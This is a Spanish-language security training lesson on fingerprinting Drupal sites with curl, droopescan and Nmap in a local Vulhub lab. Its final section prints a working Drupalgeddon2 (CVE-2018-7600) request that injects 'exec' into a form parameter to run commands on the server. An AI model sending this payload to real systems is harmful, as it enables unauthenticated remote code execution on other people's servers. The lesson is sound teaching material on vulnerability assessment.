# CMS — Drupal

## Índice

1. [Introducción a Drupal](#1-introducción-a-drupal)
2. [Despliegue del laboratorio (CVE-2018-7600)](#2-despliegue-del-laboratorio-cve-2018-7600)
3. [Reconocimiento inicial](#3-reconocimiento-inicial)
4. [Enumeración con droopescan](#4-enumeración-con-droopescan)
5. [Enumeración con Nmap](#5-enumeración-con-nmap)
6. [Sobre la vulnerabilidad Drupalgeddon2](#6-sobre-la-vulnerabilidad-drupalgeddon2)

---

## 1. Introducción a Drupal

En esta clase aprenderemos a enumerar el gestor de contenidos **Drupal**. Drupal es un sistema de gestión de contenido libre y de código abierto (CMS) utilizado para la creación de sitios web y aplicaciones web.

Drupal ofrece un alto grado de personalización y escalabilidad, lo que lo convierte en una opción popular para sitios web complejos y grandes. Se utiliza en una amplia gama de sitios, desde blogs personales hasta portales gubernamentales y empresariales. Es altamente flexible y cuenta con una amplia variedad de módulos y herramientas que permiten a los usuarios personalizar su sitio web para satisfacer sus necesidades específicas.

> **Nota:** Drupal tiene fama de ser un CMS robusto y orientado a proyectos grandes, pero también ha sufrido vulnerabilidades muy graves en el propio núcleo (como la que veremos en el laboratorio). Enumerar la versión exacta es, por tanto, especialmente importante.

---

## 2. Despliegue del laboratorio (CVE-2018-7600)

Se proporciona el enlace al proyecto de GitHub correspondiente al laboratorio que desplegaremos en Docker:

- **CVE-2018-7600**: https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600

Despliegue del entorno con Vulhub:

```bash
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/vulhub/vulhub.git
```

```bash
┌──(kali㉿kali)-[~]
└─$ cd vulhub/drupal/CVE-2018-7600
```

```bash
┌──(kali㉿kali)-[~/vulhub/drupal/CVE-2018-7600]
└─$ docker-compose up -d
```

| Comando | Descripción |
|---------|-------------|
| `git clone ...` | Descarga el repositorio de Vulhub. |
| `cd vulhub/drupal/CVE-2018-7600` | Entra en el directorio del laboratorio. |
| `docker-compose up -d` | Levanta el contenedor Drupal vulnerable en segundo plano. |

> **Nota:** CVE-2018-7600, conocida como **Drupalgeddon2**, es una vulnerabilidad crítica de **ejecución remota de código** que afecta a Drupal 7 y 8. Permite a un atacante no autenticado ejecutar comandos en el servidor. La veremos con más detalle en la sección 6.

---

## 3. Reconocimiento inicial

Para confirmar que el objetivo es Drupal y estimar su versión, el fichero `CHANGELOG.txt` es la fuente clásica:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s http://localhost/CHANGELOG.txt | head -n 10
```

**Ejemplo de salida (fragmento representativo):**

```bash
Drupal 8.5.0, 2018-03-07
-----------------------
- Various bug fixes and improvements.

Drupal 8.4.5, 2018-02-21
```

| Elemento | Descripción |
|----------|-------------|
| `curl -s` | Descarga el contenido de forma silenciosa. |
| `CHANGELOG.txt` | Registro de cambios; su primera línea suele indicar la versión instalada. |
| `head -n 10` | Muestra solo las 10 primeras líneas. |

Otras pistas rápidas están en las cabeceras HTTP y en el HTML:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s -I http://localhost/ | grep -i "x-generator\|x-drupal"
```

| Parámetro | Descripción |
|-----------|-------------|
| `-I` | Descarga solo las **cabeceras** HTTP (petición HEAD). |
| `X-Generator` / `X-Drupal-Cache` | Cabeceras que revelan que el sitio funciona sobre Drupal. |

> **Nota:** La ruta `/core/` (en Drupal 8+) o `/modules/`, `/sites/default/` (Drupal 7) también confirman el CMS. En instalaciones endurecidas, `CHANGELOG.txt` puede estar eliminado; entonces habrá que recurrir a droopescan o a las cabeceras.

---

## 4. Enumeración con droopescan

Una de las herramientas que veremos en esta clase para enumerar un Drupal es **droopescan**. Es una herramienta de escaneo de seguridad especializada en la identificación de versiones de Drupal y sus módulos, y en la detección de vulnerabilidades conocidas en ellos. Realiza un escaneo exhaustivo del sitio para encontrar versiones de Drupal instaladas, módulos activos y vulnerabilidades conocidas, lo que ayuda a administradores y desarrolladores a identificar y solucionar problemas de seguridad.

> **Nota:** droopescan es multi-CMS: aunque se centra en Drupal, también soporta SilverStripe, WordPress y Joomla. Por eso hay que indicarle explícitamente qué CMS escanear.

- **droopescan**: https://github.com/SamJoan/droopescan

Si necesitas instalarla:

```bash
┌──(kali㉿kali)-[~]
└─$ pip3 install droopescan
```

Su uso es bastante intuitivo. Ejemplo de escaneo de un Drupal:

```bash
┌──(kali㉿kali)-[~]
└─$ droopescan scan drupal --url http://localhost
```

| Parámetro | Descripción |
|-----------|-------------|
| `scan` | Indica que queremos realizar un escaneo. |
| `drupal` | Especifica que el objetivo es un Drupal (el CMS a analizar). |
| `--url http://localhost` | URL del sitio web que se va a escanear. |

**Ejemplo de salida (fragmento representativo):**

```bash
[+] Plugins found:
    ckeditor http://localhost/core/modules/ckeditor/
    image http://localhost/core/modules/image/

[+] Themes found:
    seven http://localhost/core/themes/seven/
    bartik http://localhost/core/themes/bartik/

[+] Possible version(s):
    8.5.0
    8.5.1

[+] Possible interesting urls found:
    Default admin - http://localhost/user/login

[+] Scan finished (0:00:12.345678 elapsed)
```

| Sección de la salida | Qué indica |
|----------------------|------------|
| `Plugins found` | Módulos detectados en la instalación. |
| `Themes found` | Temas instalados. |
| `Possible version(s)` | Versión (o versiones probables) del núcleo de Drupal. |
| `Possible interesting urls` | Rutas destacables, como el panel de acceso. |

> **Importante:** La versión detectada es el dato clave: cruzándola con bases de datos de vulnerabilidades (o directamente con Drupalgeddon2 en este laboratorio) sabremos si el objetivo es explotable.

Con esta herramienta se pueden llevar a cabo análisis de seguridad en sitios web basados en Drupal, lo que ayuda a prevenir posibles ataques y problemas de seguridad en el futuro.

---

## 5. Enumeración con Nmap

Nmap complementa el escaneo con scripts genéricos de HTTP:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p80 --script http-enum,http-headers localhost
```

| Script | Descripción |
|--------|-------------|
| `http-enum` | Enumera rutas y ficheros comunes (paneles, `CHANGELOG.txt`, directorios conocidos). |
| `http-headers` | Muestra las cabeceras HTTP del servidor (útil para ver `X-Generator`). |

---

## 6. Sobre la vulnerabilidad Drupalgeddon2

Una vez confirmada la versión vulnerable, el laboratorio permite estudiar **Drupalgeddon2 (CVE-2018-7600)**.

> **Importante:** El fallo reside en que Drupal **no saneaba correctamente ciertos parámetros de formularios** (los que empiezan por `#`, usados internamente por la API de renderizado). Un atacante no autenticado puede inyectar una llamada a función (por ejemplo, a `exec` o `passthru`) a través de esos parámetros, logrando ejecución remota de código sin necesidad de credenciales.

Comprobación no destructiva de la vulnerabilidad (prueba de concepto que ejecuta `id` en el servidor):

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s 'http://localhost/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
     --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
```

| Elemento | Descripción |
|----------|-------------|
| `?element_parents=account/mail/%23value` | Ruta interna del formulario que se abusa (`%23` es el carácter `#` codificado en URL). |
| `_wrapper_format=drupal_ajax` | Fuerza a Drupal a procesar la petición por su motor AJAX, donde reside el fallo. |
| `mail[#post_render][]=exec` | Indica la función a ejecutar (`exec`). |
| `mail[#markup]=id` | El comando que se ejecuta en el servidor (`id`). |

**Respuesta cuando el servidor es vulnerable:**

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)[{"command":"insert", ...}]
```

> **Advertencia:** La aparición de la salida del comando `id` (`uid=33(www-data)...`) al principio de la respuesta confirma que el servidor ejecutó el comando: es **RCE no autenticado**. La contramedida es actualizar Drupal a la versión parcheada de inmediato.

> **Recuerda:** Todas estas prácticas se realizan sobre el laboratorio desplegado en tu propia máquina. Ejecutar estas peticiones contra sitios de terceros sin autorización explícita es ilegal.
